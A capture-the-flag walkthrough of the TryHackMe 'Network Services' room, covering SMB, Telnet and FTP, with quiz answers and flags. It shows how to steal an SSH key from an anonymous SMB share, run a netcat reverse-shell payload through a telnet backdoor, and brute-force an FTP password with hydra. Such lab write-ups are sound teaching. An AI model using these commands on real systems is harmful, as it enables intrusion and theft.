# Network Services

{% embed url="https://tryhackme.com/room/networkservices" %}
https://tryhackme.com/room/networkservices
{% endembed %}

## Task 2 Understanding SMB

#### What does SMB stand for?

{% hint style="success" %}
Server Message Block
{% endhint %}

#### What type of protocol is SMB?

{% hint style="success" %}
response-request
{% endhint %}

#### **What do clients connect to servers using?**   &#x20;

{% hint style="success" %}
TCP/IP
{% endhint %}

#### **What systems does Samba run on?**

{% hint style="success" %}
Unix
{% endhint %}

## Task 3 Enumerating SMB

#### **Conduct an nmap scan of your choosing, How many ports are open?**

```
nmap 10.10.223.88
```

![](<../../.gitbook/assets/Screenshot from 2020-09-08 12-22-21.png>)

{% hint style="success" %}
`3`
{% endhint %}

#### **What ports is SMB running on?**

{% hint style="success" %}
139/445
{% endhint %}

#### Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the **workgroup** name?   &#x20;

```
enum4linux -a 10.10.223.88
```

![](<../../.gitbook/assets/Screenshot from 2020-09-08 12-24-31.png>)

{% hint style="success" %}
`WORKGROUP`
{% endhint %}

#### What comes up as the **name** of the machine?

![](<../../.gitbook/assets/Screenshot from 2020-09-08 12-27-12.png>)

{% hint style="success" %}
`POLOSMB`
{% endhint %}

#### What operating system version is running?

{% hint style="success" %}
6.1
{% endhint %}

#### What share sticks out as something we might want to investigate?

![](<../../.gitbook/assets/Screenshot from 2020-09-08 12-27-51.png>)

{% hint style="success" %}
`profiles`
{% endhint %}

## Task 4 Exploiting SMB

#### What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?

{% hint style="success" %}
`smbclient //10.10.10.2/secret -U suit -p 445`
{% endhint %}

#### Great! Now you've got a hang of the syntax, let's have a go at trying to exploit this vulnerability. You have a list of users, the name of the share (smb) and a suspected vulnerability.

#### Lets see if our interesting share has been configured to allow anonymous access, I.E it doesn't require authentication to view the files. We can do this easily by:

* using the username "Anonymous"
* connecting to the share we found during the enumeration stage
* and not supplying a password.

#### Does the share allow anonymous access?

```
smbclient //10.10.223.88/profiles -U Anonymous -N
```

![](<../../.gitbook/assets/Screenshot from 2020-09-08 12-33-34.png>)

{% hint style="success" %}
`Y`
{% endhint %}

#### **Who can we assume this profile folder belongs to?**

```
smb > get "Working From Home Information.txt"
smb > exit
cat Working\ From\ Home\ Information.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-08 12-37-35.png>)

{% hint style="success" %}
`John Cactus`
{% endhint %}

#### **What service has been configured to allow him to work from home?**

{% hint style="success" %}
ssh
{% endhint %}

#### **Okay! Now we know this, what directory on the share should we look in?**

{% hint style="success" %}
`.ssh`
{% endhint %}

#### This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?

```
smb > cd .ssh
smb > ls
```

![](<../../.gitbook/assets/Screenshot from 2020-09-08 12-44-12.png>)

{% hint style="success" %}
`id_rsa`
{% endhint %}

#### Download this file to your local machine, and change the permissions. Now, use the information you have already gathered to work out the username of the account. Then, use the service and key to log-in to the server.

```
smb > get id_rsa
smb > exit
chmod 600 id_rsa
ssh -i id_rsa cactus@10.10.223.88
```

![](<../../.gitbook/assets/Screenshot from 2020-09-08 12-47-32.png>)

#### What is the smb.txt flag?

```bash
cat smb.txt
```

{% hint style="success" %}
`THM{smb_is_fun_eh?}`
{% endhint %}

## Task 5 Understanding Telnet

#### **What is Telnet?**

{% hint style="success" %}
`application protocol`
{% endhint %}

#### What has slowly replaced Telnet?

{% hint style="success" %}
`ssh`
{% endhint %}

#### **How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?**

{% hint style="success" %}
`telnet 10.10.10.3 23`
{% endhint %}

#### **The lack of what, means that all Telnet communication is in plaintext?**

{% hint style="success" %}
`encryption`
{% endhint %}

## Task 6 Enumerating Telnet

#### How many ports are open on the target machine?

```bash
nmap -Pn -p- -v 10.10.206.191
```

![](<../../.gitbook/assets/Screenshot from 2020-09-08 22-43-54.png>)

{% hint style="success" %}
`1`
{% endhint %}

#### What **port** is this?

{% hint style="success" %}
`8012`
{% endhint %}

#### This port is unassigned, but still lists the **protocol** it's using, what protocol is this?

{% hint style="success" %}
`tcp`
{% endhint %}

#### Now re-run the **nmap** scan, without the **-p-** tag, how many ports show up as open?

```
nmap 10.10.133.186
```

![](<../../.gitbook/assets/Screenshot from 2020-09-08 23-26-42.png>)

{% hint style="success" %}
`0`
{% endhint %}

#### Here, we see that by assigning telnet to a **non-standard port**, it is not part of the common ports list, or top 1000 ports, that nmap scans. It's important to try every angle when enumerating, as the information you gather here will inform your exploitation stage.

#### Based on the title returned to us, what do we think this port could be used for?

```
nmap -sV -p8012 10.10.206.191
```

![](<../../.gitbook/assets/Screenshot from 2020-09-08 22-50-07.png>)

{% hint style="success" %}
`a backdoor`
{% endhint %}

#### Who could it belong to? Gathering possible **usernames** is an important step in enumeration.

{% hint style="success" %}
`skidy`
{% endhint %}

## Task 7 Exploiting Telnet

#### Okay, let's try and connect to this telnet port! If you get stuck, have a look at the syntax for connecting outlined above.

```
telnet 10.10.30.151 8012
```

![](<../../.gitbook/assets/Screenshot from 2020-09-08 23-00-53.png>)

#### Great! It's an open telnet connection! What welcome message do we receive?

{% hint style="success" %}
`SKIDY'S BACKDOOR`
{% endhint %}

#### Let's try executing some commands, do we get a return on any input we enter into the telnet session?

{% hint style="success" %}
`N`
{% endhint %}

#### Hmm... that's strange. Let's check to see if what we're typing is being executed as a system command.

#### Start a tcpdump listener on your local machine.

```
sudo tcpdump -i tun0 icmp
```

![](<../../.gitbook/assets/Screenshot from 2020-09-08 23-09-48.png>)

#### Now, use the command "ping \[local tun0 ip] -c 1" through the telnet session to see if we're able to execute system commands. Do we receive any pings?

```
.RUN ping 10.9.101.193 -c 1
```

![](<../../.gitbook/assets/Screenshot from 2020-09-08 23-09-51.png>)

{% hint style="success" %}
`Y`
{% endhint %}

#### Great! This means that we are able to execute system commands AND that we are able to reach our local machine. Now let's have some fun!.

#### We're going to generate a reverse shell payload using msfvenom. This will generate and encode a netcat reverse shell for us.

```
msfvenom -p cmd/unix/reverse_netcat LHOST=10.9.101.193
```

![](<../../.gitbook/assets/Screenshot from 2020-09-08 23-13-18.png>)

#### What word does the generated payload start with?

{% hint style="success" %}
`mkfifo`
{% endhint %}

#### Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine.

```bash
nc -nvlp 4444
```

#### What would the command look like for the listening port we selected in our payload?

{% hint style="success" %}
`nc -lvp 4444`
{% endhint %}

#### Great! Now that's running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine!

```
.RUN mkfifo /tmp/gtjkwze; nc 10.9.101.193 4444 0</tmp/gtjkwze | /bin/sh >/tmp/gtjkwze 2>&1; rm /tmp/gtjkwze
```

![](<../../.gitbook/assets/Screenshot from 2020-09-08 23-14-54.png>)

#### **Success! What is the contents of flag.txt?**

```
cat flag.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-08 23-14-51.png>)

{% hint style="success" %}
`THM{y0u_g0t_th3_t3lnt_fl4g}`
{% endhint %}

## Task 8 Understanding FTP

#### **What communications model does FTP use?**

{% hint style="success" %}
client-server
{% endhint %}

#### What's the standard FTP port?

{% hint style="success" %}
`21`
{% endhint %}

#### How many modes of FTP connection are there?

{% hint style="success" %}
`2`
{% endhint %}

## Task 9 Enumerating FTP

#### Run an **nmap** scan of your choice.

#### How many ports are open on the target machine?

```
nmap -Pn 10.10.66.149
```

![](<../../.gitbook/assets/Screenshot from 2020-09-09 08-42-44.png>)

{% hint style="success" %}
`2`
{% endhint %}

#### What port is ftp running on?

{% hint style="success" %}
`21`
{% endhint %}

#### What variant of FTP is running on it?

```
nmap -Pn -sV -p21 10.10.66.149
```

![](<../../.gitbook/assets/Screenshot from 2020-09-09 09-10-05.png>)

{% hint style="success" %}
`vsftpd`
{% endhint %}

#### Great, now we know what type of FTP server we're dealing with we can check to see if we are able to login anonymously to the FTP server.

#### What is the name of the file in the anonymous FTP directory?

```
lftp -u anonymous 10.10.66.149
ftp > ls
```

![](<../../.gitbook/assets/Screenshot from 2020-09-09 08-48-04.png>)

{% hint style="success" %}
`PUBLIC_NOTICE.txt`
{% endhint %}

#### What do we think a possible username could be?

```
ftp > cat PUBLIC_NOTICE.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-09 08-50-41.png>)

{% hint style="success" %}
`mike`
{% endhint %}

## Task 10 Exploiting FTP

### What is the password for the user "mike"?

```
hydra -l mike -P /usr/share/wordlists/rockyou.txt ftp://10.10.66.149 -f -t64
```

![](<../../.gitbook/assets/Screenshot from 2020-09-09 08-56-51.png>)

{% hint style="success" %}
`password`
{% endhint %}

#### Bingo! Now, let's connect to the FTP server as this user **** and entering the credentials when prompted. What is ftp.txt?

```
lftp -u mike,password 10.10.66.149
ftp > cat ftp.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-09 09-00-50.png>)

{% hint style="success" %}
`THM{y0u_g0t_th3_ftp_fl4g}`
{% endhint %}

## :link: Support Material

{% embed url="https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef" %}

{% embed url="https://attack.mitre.org/techniques/T1210/" %}

{% embed url="https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/" %}
